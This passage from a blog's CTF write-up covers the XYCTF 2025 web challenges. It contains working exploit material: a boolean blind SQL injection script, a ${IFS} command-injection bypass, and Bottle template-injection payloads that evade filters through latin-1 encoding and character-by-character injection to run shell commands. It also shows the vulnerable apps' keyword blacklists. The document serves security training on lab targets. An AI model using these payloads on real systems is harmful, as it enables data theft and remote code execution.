name.decode()&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin2.png"></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>禁用了鼠标和键盘，更多工具中打开开发者工具，发现有反调试，右键选择“向忽略列表添加脚本”，虽然无法调试但并没有什么影响</p><p>题目说要是能在2秒内解决这个puzzl，就给flag，与时间有关，在源码中检索关键词time，发现startTime和endTime，估计flag的弹窗条件为endTime-startTime &lt; 2，通过控制台赋一个较大值给startTime，如startTime &#x3D; 10000000000</p><p>然后完成拼图即可</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/puzzl1.png"></p><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>提示有sql注入，通过尝试确定username为注入点</p><p>尝试用万能密码’or(1&#x3D;1)#</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/ezsql1.png"></p><p>还有一层需要输入密钥，利用布尔盲注</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20185/login.php&quot;</span><br>secret = <span class="hljs-string">&quot;&quot;</span><br>char_set = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char_set:<br>        <br>        <span class="hljs-comment">#爆库名</span><br>        <span class="hljs-comment">#payload =  f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆表名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#)&quot;</span><br><br>        <span class="hljs-comment">#爆列名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆字段</span><br>        payload = <span class="hljs-string">f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)from\tdouble_check)from(<span class="hljs-subst">&#123;i&#125;</span>)for(1))=&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;#&quot;</span><br><br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>: payload, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span>&#125;<br><br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;目前由于系统恶意登录尝试请求过多,现已开启双重认证机制,请输入管理员账户的秘钥&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            secret += j<br>            <span class="hljs-built_in">print</span>(secret)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><blockquote><p>secret：dtfrtkcc0czkoua9s</p></blockquote><p>命令执行无回显并将空格禁用，利用${IFS}绕过和&gt;重定向</p><blockquote><p>cat${IFS}&#x2F;f*${IFS}&gt;flag.txt</p></blockquote><p>再访问&#x2F;flag.txt即可</p><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>明显的bottle模板注入，但限制了长度并禁用了open和\</p><p>可以用latin-1绕过对open的禁用（但似乎只有少数字符在在部分情况下才会被正确解析为对应的ascii码，参考博客：<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019%EF%BC%89">https://www.cnblogs.com/LAMENTXU/articles/18805019）</a></p><blockquote><p>Latin-1编码，也称为ISO-8859-1，是一种单字节字符集，它扩展了ASCII编码以包括西欧语言的字符。Latin-1编码的范围是0x00-0xFF，其中0x00-0x7F之间的编码与ASCII完全一致，而0x80-0xFF之间则包含了控制字符和文字符号。这种编码方式在支持Latin-1的系统中传输和存储其他任何编码的字节流时，不会丢失信息，这使得它在某些数据库系统中，如MySQL中被默认使用。在处理Latin-1编码时，需要注意的是，尽管它兼容ASCII编码，但它并不支持所有语言的字符。</p></blockquote><p>将o替换成%ba即可</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy1.png"></p><p>也可以用bottle的模板语法，将payload字符逐个注入，绕过长度限制，然后执行</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20187/attack&quot;</span><br>payload = <span class="hljs-string">f&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f* &gt; hah&#x27;)&quot;</span><br><br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: tmp&#125;)<br><br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%include(&#x27;hah&#x27;)&quot;</span>&#125;).text<br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> , <span class="hljs-string">&#x27;read&#x27;</span><br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>较上一题，将read及其一些其他字符禁用</p><p>继续利用latin-1绕过</p><p>将o替换成%ba，将a替换成%aa</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy_again.png"></p><p>参考博客：</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p><p><a href="https://blog.csdn.net/oyf3085227433/article/details/147075769">https://blog.csdn.net/oyf3085227433/article/details/147075769</a></p><p><a href="https://www.cnblogs.com/ddd-flag/articles/18816057">https://www.cnblogs.com/ddd-flag/articles/18816057</a></p><p><a href="https://www.mcso.top/all/">https://www.mcso.top/all/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
